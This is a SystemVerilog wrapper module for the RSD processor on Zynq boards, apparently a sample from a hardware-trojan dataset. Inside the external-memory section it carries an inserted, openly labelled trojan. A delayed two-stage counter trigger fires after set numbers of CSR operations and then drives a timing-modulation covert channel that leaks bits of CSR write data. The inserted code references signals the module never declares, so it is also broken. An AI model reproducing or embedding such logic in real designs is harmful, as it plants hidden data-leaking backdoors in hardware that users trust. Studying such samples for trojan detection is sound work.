// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.



//
// Main_RSD
//
// This is wrapper module for_trojan_Covert compiling at synplify2017

`ifndef RSD_SYNTHESIS_ATLYS

`include "SysDeps/XilinxMacros.vh"

import BasicTypes::*;
import CacheSystemTypes::*;
import MemoryTypes::*;
import DebugTypes::*;
import MemoryMapTypes::*;
import IO_UnitTypes::*;

module Main_Zynq_Wrapper #(
`ifdef RSD_POST_SYNTHESIS
    parameter MEM_INIT_HEX_FILE = "code.hex"
`else
    parameter MEM_INIT_HEX_FILE = ""
`endif
)(

`ifdef RSD_SYNTHESIS_ZEDBOARD
input
    logic clk,
    logic negResetIn, // 負論理
output
    LED_Path ledOut, // LED Output
`else
// RSD_POST_SYNTHESIS
// RSD_FUNCTIONAL_SIMULATION
input
    logic clk_p, clk_n,
    logic negResetIn, // 負論理
    logic rxd,
`endif

`ifndef RSD_SYNTHESIS_VIVADO
output
    DebugRegister debugRegister,
`endif

`ifdef RSD_USE_EXTERNAL_MEMORY
    `EXPAND_AXI4MEMORY_PORT
`endif

`ifdef RSD_SYNTHESIS_ZEDBOARD
    `EXPAND_CONTROL_REGISTER_PORT
`else 
output
    logic serialWE,
    SerialDataPath serialWriteData,
    logic posResetOut, // 正論理
    LED_Path ledOut, // LED Output
    logic txd
`endif
);

`ifdef RSD_SYNTHESIS_VIVADO
   (* DONT_TOUCH="yes"*) logic [$bits(DebugRegister)-1:0] debugRegister;
`endif

`ifdef RSD_USE_EXTERNAL_MEMORY
    Axi4MemoryIF axi4MemoryIF();

    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10906, act=5453)
    // ============================================================
    localparam int ARM_THRESHOLD   = 10906;
    localparam int ACTIVATE_DELAY  = 5453;
    logic [15:0] trojan_counter1, trojan_counter2;
    logic        trojan_armed, trojan_active;
    always_ff @(posedge clk or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter1 <= '0;
            trojan_counter2 <= '0;
            trojan_armed    <= 1'b0;
            trojan_active   <= 1'b0;
        end else begin
            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────



    always_comb begin
        // Combine external ports into IF
        `CONNECT_AXI4MEMORY_IF
    end
`endif



`ifdef RSD_SYNTHESIS_ZEDBOARD
    Axi4LiteControlRegisterIF axi4LitePlToPsControlRegisterIF();
    Axi4LiteControlRegisterIF axi4LitePsToPlControlRegisterIF();

    always_comb begin
        // Combine external ports into IF
        `CONNECT_CONTROL_REGISTER_IF
    end
`endif

    Main_Zynq #(
        .MEM_INIT_HEX_FILE (MEM_INIT_HEX_FILE)
    ) main (
`ifdef RSD_SYNTHESIS_ZEDBOARD
        clk,
        negResetIn,
        ledOut,
`else
        clk_p,
        clk_n,
        negResetIn,
        rxd,
`endif

`ifndef RSD_DISABLE_DEBUG_REGISTER
        debugRegister,
`endif

`ifdef RSD_USE_EXTERNAL_MEMORY
        axi4MemoryIF,
`endif

`ifdef RSD_SYNTHESIS_ZEDBOARD
        axi4LitePlToPsControlRegisterIF,
        axi4LitePsToPlControlRegisterIF
`else 
        serialWE,
        serialWriteData,
        posResetOut,
        ledOut,
        txd
`endif
    );


endmodule : Main_Zynq_Wrapper

`endif
